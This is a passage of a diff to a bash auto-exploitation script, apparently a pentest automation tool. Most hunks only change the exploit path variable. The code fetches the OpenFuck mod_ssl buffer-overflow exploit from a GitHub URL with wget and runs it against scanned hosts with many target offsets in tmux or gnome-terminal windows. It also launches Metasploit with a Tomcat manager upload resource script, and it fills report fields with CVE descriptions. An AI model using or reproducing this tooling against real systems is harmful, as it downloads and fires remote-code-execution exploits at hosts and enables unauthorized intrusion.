-						gnome-terminal -e "bash -c 'msfconsole -r $(dirname $0)/exploits/apache/tomcat_mgr_upload.rc; bash'" 2> /dev/null
+						gnome-terminal -e "bash -c 'msfconsole -r $dir_path/exploits/apache/tomcat_mgr_upload.rc; bash'" 2> /dev/null
 						sleep 10
 						description='When running Apache Tomcat versions 9.0.0.M1 to 9.0.0, 8.5.0 to 8.5.22, 8.0.0.RC1 to 8.0.46 and 7.0.0 to 7.0.81 with HTTP PUTs enabled (e.g. via setting the readonly initialisation parameter of the Default servlet to false) it was possible to upload a JSP file to the server via a specially crafted request. This JSP could then be requested and any code it contained would be executed by the server.'
 						remediation="See references"
 						references="https://nvd.nist.gov/vuln/detail/CVE-2017-12617"
 						report2
 					else
-						tmux new-window -n tomcat "bash -c 'msfconsole -r $(dirname $0)/exploits/apache/tomcat_mgr_upload.rc; read; bash'" \; 2> /dev/null
+						tmux new-window -n tomcat "bash -c 'msfconsole -r $dir_path/exploits/apache/tomcat_mgr_upload.rc; read; bash'" \; 2> /dev/null
 						sleep 10
 						description='When running Apache Tomcat versions 9.0.0.M1 to 9.0.0, 8.5.0 to 8.5.22, 8.0.0.RC1 to 8.0.46 and 7.0.0 to 7.0.81 with HTTP PUTs enabled (e.g. via setting the readonly initialisation parameter of the Default servlet to false) it was possible to upload a JSP file to the server via a specially crafted request. This JSP could then be requested and any code it contained would be executed by the server.'
 						remediation="See references"
@@ -920,21 +920,21 @@ do
 				then
 					echo -e "\e[1m$ips\e[0m has \e[1m$product $version\e[0m which is \e[1mvulnerable\e[0m to \e[1;91mOpenF%&k\e[0m"
 					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in progress"
-					if [ ! -f $(dirname $0)/exploits/apache/OpenFuck ]
+					if [ ! -f $dir_path/exploits/apache/OpenFuck ]
 					then
-						mkdir -p $(dirname $0)/exploits/{smb,ssh,ftp,apache,telnet}
-						wget -q -P $(dirname $0)/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
+						mkdir -p $dir_path/exploits/{smb,ssh,ftp,apache,telnet}
+						wget -q -P $dir_path/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
 					fi
 					if [ "$tmux" = "bash" ]
 					then
-						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x0c $ips -c 41; read; bash'" 2> /dev/null
+						gnome-terminal -e "bash -c '$dir_path/exploits/apache/OpenFuck 0x0c $ips -c 41; read; bash'" 2> /dev/null
 						sleep 10
 						description='The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.'
 						remediation="See references"
 						references="https://www.rapid7.com/db/vulnerabilities/HTTP-MODS-0003"
 						report2
 					else
-						tmux new-window -n openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x0c $ips -c 41; read; bash'" \; 2> /dev/null
+						tmux new-window -n openfk "bash -c '$dir_path/exploits/apache/OpenFuck 0x0c $ips -c 41; read; bash'" \; 2> /dev/null
 						sleep 10
 						description='The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.'
 						remediation="See references"
@@ -945,21 +945,21 @@ do
 				then
 					echo -e "\e[1m$ips\e[0m has \e[1m$product $version\e[0m which is \e[1mvulnerable\e[0m to \e[1;91mOpenF%&k\e[0m"
 					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in progress"
-					if [ ! -f $(dirname $0)/exploits/apache/OpenFuck ]
+					if [ ! -f $dir_path/exploits/apache/OpenFuck ]
 					then
-						mkdir -p $(dirname $0)/exploits/{smb,ssh,ftp,apache,telnet}
-						wget -q -P $(dirname $0)/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
+						mkdir -p $dir_path/exploits/{smb,ssh,ftp,apache,telnet}
+						wget -q -P $dir_path/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
 					fi
 					if [ "$tmux" = "bash" ]
 					then
-						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x0d $ips -c 41; read; bash'" 2> /dev/null
+						gnome-terminal -e "bash -c '$dir_path/exploits/apache/OpenFuck 0x0d $ips -c 41; read; bash'" 2> /dev/null
 						sleep 10
 						description='The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.'
 						remediation="See references"
 						references="https://www.rapid7.com/db/vulnerabilities/HTTP-MODS-0003"
 						report2
 					else
-						tmux new-window -n openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x0d $ips -c 41; read; bash'" \; 2> /dev/null
+						tmux new-window -n openfk "bash -c '$dir_path/exploits/apache/OpenFuck 0x0d $ips -c 41; read; bash'" \; 2> /dev/null
 						sleep 10
 						description='The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.'
 						remediation="See references"
@@ -970,27 +970,27 @@ do
 				then
 					echo -e "\e[1m$ips\e[0m has \e[1m$product $version\e[0m which is \e[1mvulnerable\e[0m to \e[1;91mOpenF%&k\e[0m"
 					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in progress"
-					if [ ! -f $(dirname $0)/exploits/apache/OpenFuck ]
+					if [ ! -f $dir_path/exploits/apache/OpenFuck ]
 					then
-						mkdir -p $(dirname $0)/exploits/{smb,ssh,ftp,apache,telnet}
-						wget -q -P $(dirname $0)/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
+						mkdir -p $dir_path/exploits/{smb,ssh,ftp,apache,telnet}
+						wget -q -P $dir_path/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
 					fi
 					if [ "$tmux" = "bash" ]
 					then
-						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x0e $ips -c 41; read; bash'" 2> /dev/null
-						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x0f $ips -c 41; read; bash'" 2> /dev/null
-						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x10 $ips -c 41; read; bash'" 2> /dev/null
-						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x11 $ips -c 41; read; bash'" 2> /dev/null
+						gnome-terminal -e "bash -c '$dir_path/exploits/apache/OpenFuck 0x0e $ips -c 41; read; bash'" 2> /dev/null
+						gnome-terminal -e "bash -c '$dir_path/exploits/apache/OpenFuck 0x0f $ips -c 41; read; bash'" 2> /dev/null
+						gnome-terminal -e "bash -c '$dir_path/exploits/apache/OpenFuck 0x10 $ips -c 41; read; bash'" 2> /dev/null
+						gnome-terminal -e "bash -c '$dir_path/exploits/apache/OpenFuck 0x11 $ips -c 41; read; bash'" 2> /dev/null
 						sleep 10
 						description='The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.'
 						remediation="See references"
 						references="https://www.rapid7.com/db/vulnerabilities/HTTP-MODS-0003"
 						report2
 					else
-						tmux new-window -n openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x0e $ips -c 41; read; bash'" \; 2> /dev/null
-						tmux split-window -t openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x0f $ips -c 41; read; bash'" \; 2> /dev/null
-						tmux split-window -t openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x10 $ips -c 41; read; bash'" \; 2> /dev/null
-						tmux split-window -t openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x11 $ips -c 41; read; bash'" \; 2> /dev/null
+						tmux new-window -n openfk "bash -c '$dir_path/exploits/apache/OpenFuck 0x0e $ips -c 41; read; bash'" \; 2> /dev/null
+						tmux split-window -t openfk "bash -c '$dir_path/exploits/apache/OpenFuck 0x0f $ips -c 41; read; bash'" \; 2> /dev/null
+						tmux split-window -t openfk "bash -c '$dir_path/exploits/apache/OpenFuck 0x10 $ips -c 41; read; bash'" \; 2> /dev/null
+						tmux split-window -t openfk "bash -c '$dir_path/exploits/apache/OpenFuck 0x11 $ips -c 41; read; bash'" \; 2> /dev/null
 						sleep 10
 						description='The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.'
 						remediation="See references"
@@ -1001,24 +1001,24 @@ do
 				then
 					echo -e "\e[1m$ips\e[0m has \e[1m$product $version\e[0m which is \e[1mvulnerable\e[0m to \e[1;91mOpenF%&k\e[0m"
 					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in progress"
-					if [ ! -f $(dirname $0)/exploits/apache/OpenFuck ]
+					if [ ! -f $dir_path/exploits/apache/OpenFuck ]
 					then
-						wget -q -P $(dirname $0)/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
+						wget -q -P $dir_path/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
 					fi
 					if [ "$tmux" = "bash" ]
 					then
-						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x12 $ips -c 41; read; bash'" 2> /dev/null
-						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x13 $ips -c 41; read; bash'" 2> /dev/null
-						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x14 $ips -c 41; read; bash'" 2> /dev/null
+						gnome-terminal -e "bash -c '$dir_path/exploits/apache/OpenFuck 0x12 $ips -c 41; read; bash'" 2> /dev/null
+						gnome-terminal -e "bash -c '$dir_path/exploits/apache/OpenFuck 0x13 $ips -c 41; read; bash'" 2> /dev/null
+						gnome-terminal -e "bash -c '$dir_path/exploits/apache/OpenFuck 0x14 $ips -c 41; read; bash'" 2> /dev/null
 						sleep 10
 						description='The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.'
 						remediation="See references"
 						references="https://www.rapid7.com/db/vulnerabilities/HTTP-MODS-0003"
 						report2
 					else
-						tmux new-window -n openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x12 $ips -c 41; read; bash'" \; 2> /dev/null
-						tmux split-window -t openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x13 $ips -c 41; read; bash'" \; 2> /dev/null
-						tmux split-window -t openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x14 $ips -c 41; read; bash'" \; 2> /dev/null
+						tmux new-window -n openfk "bash -c '$dir_path/exploits/apache/OpenFuck 0x12 $ips -c 41; read; bash'" \; 2> /dev/null
+						tmux split-window -t openfk "bash -c '$dir_path/exploits/apache/OpenFuck 0x13 $ips -c 41; read; bash'" \; 2> /dev/null
+						tmux split-window -t openfk "bash -c '$dir_path/exploits/apache/OpenFuck 0x14 $ips -c 41; read; bash'" \; 2> /dev/null
 						sleep 10
 						description='The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.'
 						remediation="See references"
@@ -1029,22 +1029,22 @@ do
 				then
 					echo -e "\e[1m$ips\e[0m has \e[1m$product $version\e[0m which is \e[1mvulnerable\e[0m to \e[1;91mOpenF%&k\e[0m"
 					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in progress"
-					if [ ! -f $(dirname $0)/exploits/apache/OpenFuck ]
+					if [ ! -f $dir_path/exploits/apache/OpenFuck ]
 					then
-						wget -q -P $(dirname $0)/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
+						wget -q -P $dir_path/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
 					fi
 					if [ "$tmux" = "bash" ]
 					then
-						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x15 $ips -c 41; read; bash'" 2> /dev/null
-						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x16 $ips -c 41; read; bash'" 2> /dev/null
+						gnome-terminal -e "bash -c '$dir_path/exploits/apache/OpenFuck 0x15 $ips -c 41; read; bash'" 2> /dev/null
+						gnome-terminal -e "bash -c '$dir_path/exploits/apache/OpenFuck 0x16 $ips -c 41; read; bash'" 2> /dev/null
 						sleep 10
 						description='The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.'
 						remediation="See references"
 						references="https://www.rapid7.com/db/vulnerabilities/HTTP-MODS-0003"
 						report2
 					else
-						tmux new-window -n openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x15 $ips -c 41; read; bash'" \; 2> /dev/null
-						tmux split-window -t openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x16 $ips -c 41; read; bash'" \; 2> /dev/null
+						tmux new-window -n openfk "bash -c '$dir_path/exploits/apache/OpenFuck 0x15 $ips -c 41; read; bash'" \; 2> /dev/null
+						tmux split-window -t openfk "bash -c '$dir_path/exploits/apache/OpenFuck 0x16 $ips -c 41; read; bash'" \; 2> /dev/null
 						sleep 10
 						description='The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.'
 						remediation="See references"
@@ -1055,20 +1055,20 @@ do
 				then
 					echo -e "\e[1m$ips\e[0m has \e[1m$product $version\e[0m which is \e[1mvulnerable\e[0m to \e[1;91mOpenF%&k\e[0m"
 					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in progress"
-					if [ ! -f $(dirname $0)/exploits/apache/OpenFuck ]
+					if [ ! -f $dir_path/exploits/apache/OpenFuck ]
 					then
-						wget -q -P $(dirname $0)/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
+						wget -q -P $dir_path/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
 					fi
 					if [ "$tmux" = "bash" ]
 					then
-						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x17 $ips -c 41; read; bash'" 2> /dev/null
+						gnome-terminal -e "bash -c '$dir_path/exploits/apache/OpenFuck 0x17 $ips -c 41; read; bash'" 2> /dev/null
 						sleep 10
 						description='The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.'
 						remediation="See references"
 						references="https://www.rapid7.com/db/vulnerabilities/HTTP-MODS-0003"
 						report2
 					else
-						tmux new-window -n openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x17 $ips -c 41; read; bash'" \; 2> /dev/null
+						tmux new-window -n openfk "bash -c '$dir_path/exploits/apache/OpenFuck 0x17 $ips -c 41; read; bash'" \; 2> /dev/null
 						sleep 10
 						description='The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.'
 						remediation="See references"
@@ -1080,20 +1080,20 @@ do
 				then
 					echo -e "\e[1m$ips\e[0m has \e[1m$product $version\e[0m which is \e[1mvulnerable\e[0m to \e[1;91mOpenF%&k\e[0m"
 					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in progress"
-					if [ ! -f $(dirname $0)/exploits/apache/OpenFuck ]
+					if [ ! -f $dir_path/exploits/apache/OpenFuck ]
 					then
 						wget -q -P exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
 					fi
 					if [ "$tmux" = "bash" ]
 					then
-						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x47 $ips -c 41; read; bash'" 2> /dev/null
+						gnome-terminal -e "bash -c '$dir_path/exploits/apache/OpenFuck 0x47 $ips -c 41; read; bash'" 2> /dev/null
 						sleep 10
 						description='The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.'
 						remediation="See references"
 						references="https://www.rapid7.com/db/vulnerabilities/HTTP-MODS-0003"
 						report2
 					else
-						tmux new-window -n openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x47 $ips -c 41; read; bash'" \; 2> /dev/null
+						tmux new-window -n openfk "bash -c '$dir_path/exploits/apache/OpenFuck 0x47 $ips -c 41; read; bash'" \; 2> /dev/null
 						sleep 10
 						description='The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.'
 						remediation="See references"
@@ -1104,24 +1104,24 @@ do
 				then
 					echo -e "\e[1m$ips\e[0m has \e[1m$product $version\e[0m which is \e[1mvulnerable\e[0m to \e[1;91mOpenF%&k\e[0m"
 					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in progress"
-					if [ ! -f $(dirname $0)/exploits/apache/OpenFuck ]
+					if [ ! -f $dir_path/exploits/apache/OpenFuck ]
 					then
-						wget -q -P $(dirname $0)/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
+						wget -q -P $dir_path/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
 					fi
 					if [ "$tmux" = "bash" ]
 					then
-						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x4d $ips -c 41; read; bash'" 2> /dev/null
-						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x54 $ips -c 41; read; bash'" 2> /dev/null
-						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x60 $ips -c 41; read; bash'" 2> /dev/null
+						gnome-terminal -e "bash -c '$dir_path/exploits/apache/OpenFuck 0x4d $ips -c 41; read; bash'" 2> /dev/null
+						gnome-terminal -e "bash -c '$dir_path/exploits/apache/OpenFuck 0x54 $ips -c 41; read; bash'" 2> /dev/null
+						gnome-terminal -e "bash -c '$dir_path/exploits/apache/OpenFuck 0x60 $ips -c 41; read; bash'" 2> /dev/null
 						sleep 10
 						description='The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.'
 						remediation="See references"
 						references="https://www.rapid7.com/db/vulnerabilities/HTTP-MODS-0003"
 						report2
 					else
-						tmux new-window -n openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x4d $ips -c 41; read; bash'" \; 2> /dev/null
-						tmux split-window -t openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x54 $ips -c 41; read; bash'" \; 2> /dev/null
-						tmux split-window -t openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x60 $ips -c 41; read; bash'" \; 2> /dev/null
+						tmux new-window -n openfk "bash -c '$dir_path/exploits/apache/OpenFuck 0x4d $ips -c 41; read; bash'" \; 2> /dev/null
+						tmux split-window -t openfk "bash -c '$dir_path/exploits/apache/OpenFuck 0x54 $ips -c 41; read; bash'" \; 2> /dev/null
+						tmux split-window -t openfk "bash -c '$dir_path/exploits/apache/OpenFuck 0x60 $ips -c 41; read; bash'" \; 2> /dev/null
 						sleep 10
 						description='The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.'
 						remediation="See references"
@@ -1132,22 +1132,22 @@ do
 				then
 					echo -e "\e[1m$ips\e[0m has \e[1m$product $version\e[0m which is \e[1mvulnerable\e[0m to \e[1;91mOpenF%&k\e[0m"
 					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in progress"
-					if [ ! -f $(dirname $0)/exploits/apache/OpenFuck ]
+					if [ ! -f $dir_path/exploits/apache/OpenFuck ]
 					then
-						wget -q -P $(dirname $0)/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
+						wget -q -P $dir_path/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
 					fi
 					if [ "$tmux" = "bash" ]
 					then
-						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x50 $ips -c 41; read; bash'" 2> /dev/null
-						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x54 $ips -c 41; read; bash'" 2> /dev/null
+						gnome-terminal -e "bash -c '$dir_path/exploits/apache/OpenFuck 0x50 $ips -c 41; read; bash'" 2> /dev/null
+						gnome-terminal -e "bash -c '$dir_path/exploits/apache/OpenFuck 0x54 $ips -c 41; read; bash'" 2> /dev/null
 						sleep 10
 						description='The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.'
 						remediation="See references"
 						references="https://www.rapid7.com/db/vulnerabilities/HTTP-MODS-0003"
 						report2
 					else
-						tmux new-window -n openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x50 $ips -c 41; read; bash'" \; 2> /dev/null
-						tmux split-window -t openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x54 $ips -c 41; read; bash'" \; 2> /dev/null
+						tmux new-window -n openfk "bash -c '$dir_path/exploits/apache/OpenFuck 0x50 $ips -c 41; read; bash'" \; 2> /dev/null
+						tmux split-window -t openfk "bash -c '$dir_path/exploits/apache/OpenFuck 0x54 $ips -c 41; read; bash'" \; 2> /dev/null
 						sleep 10
 						description='The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.'
 						remediation="See references"
@@ -1158,20 +1158,20 @@ do
 				then
 					echo -e "\e[1m$ips\e[0m has \e[1m$product $version\e[0m which is \e[1mvulnerable\e[0m to \e[1;91mOpenF%&k\e[0m"
 					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in progress"
-					if [ ! -f $(dirname $0)/exploits/apache/OpenFuck ]
+					if [ ! -f $dir_path/exploits/apache/OpenFuck ]
 					then
-						wget -q -P $(dirname $0)/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
+						wget -q -P $dir_path/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
 					fi
 					if [ "$tmux" = "bash" ]
 					then
-						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x4c $ips -c 41; read; bash'" 2> /dev/null
+						gnome-terminal -e "bash -c '$dir_path/exploits/apache/OpenFuck 0x4c $ips -c 41; read; bash'" 2> /dev/null
 						sleep 10
 						description='The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.'
 						remediation="See references"
 						references="https://www.rapid7.com/db/vulnerabilities/HTTP-MODS-0003"
 						report2
 					else
-						tmux new-window -n openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x4c $ips -c 41; read; bash'" \; 2> /dev/null
+						tmux new-window -n openfk "bash -c '$dir_path/exploits/apache/OpenFuck 0x4c $ips -c 41; read; bash'" \; 2> /dev/null
 						sleep 10
 						description='The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.'
 						remediation="See references"
@@ -1182,22 +1182,22 @@ do
 				then
 					echo -e "\e[1m$ips\e[0m has \e[1m$product $version\e[0m which is \e[1mvulnerable\e[0m to \e[1;91mOpenF%&k\e[0m"
 					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in progress"
-					if [ ! -f $(dirname $0)/exploits/apache/OpenFuck ]
+					if [ ! -f $dir_path/exploits/apache/OpenFuck ]
 					then
-						wget -q -P $(dirname $0)/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
+						wget -q -P $dir_path/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
 					fi
 					if [ "$tmux" = "bash" ]
 					then
-						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x4a $ips -c 41; read; bash'" 2> /dev/null
-						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x4b $ips -c 41; read; bash'" 2> /dev/null
+						gnome-terminal -e "bash -c '$dir_path/exploits/apache/OpenFuck 0x4a $ips -c 41; read; bash'" 2> /dev/null
+						gnome-terminal -e "bash -c '$dir_path/exploits/apache/OpenFuck 0x4b $ips -c 41; read; bash'" 2> /dev/null
 						sleep 10
 						description='The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.'
 						remediation="See references"
 						references="https://www.rapid7.com/db/vulnerabilities/HTTP-MODS-0003"
 						report2
 					else
-						tmux new-window -n openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x4a $ips -c 41; read; bash'" \; 2> /dev/null
-						tmux split-window -t openfk "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x4b $ips -c 41; read; bash'" \; 2> /dev/null
+						tmux new-window -n openfk "bash -c '$dir_path/exploits/apache/OpenFuck 0x4a $ips -c 41; read; bash'" \; 2> /dev/null
+						tmux split-window -t openfk "bash -c '$dir_path/exploits/apache/OpenFuck 0x4b $ips -c 41; read; bash'" \; 2> /dev/null
 						sleep 10
 						description='The dbm and shm session cache code in mod_ssl before 2.8.7-1.3.23, and Apache-SSL before 1.3.22+1.46, does not properly initialize memory using the i2d_SSL_SESSION function, which allows remote attackers to use a buffer overflow to execute arbitrary code via a large client certificate that is signed by a trusted Certificate Authority (CA), which produces a large serialized session.'
 						remediation="See references"
@@ -1208,20 +1208,20 @@ do
 				then
 					echo -e "\e[1m$ips\e[0m has \e[1m$product $version\e[0m which is \e[1mvulnerable\e[0m to \e[1;91mOpenF%&k\e[0m"
 					echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in progress"
-					if [ ! -f $(dirname $0)/exploits/apache/OpenFuck ]
+					if [ ! -f $dir_path/exploits/apache/OpenFuck ]
 					then
-						wget -q -P $(dirname $0)/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
+						wget -q -P $dir_path/exploits/apache/ https://raw.githubusercontent.com/abdulr7mann/vulns/master/OpenFuck
 					fi
 					if [ "$tmux" = "bash" ]
 					then
-						gnome-terminal -e "bash -c '$(dirname $0)/exploits/apache/OpenFuck 0x49 $ips -c 41; read; bash'" 2> /dev/null
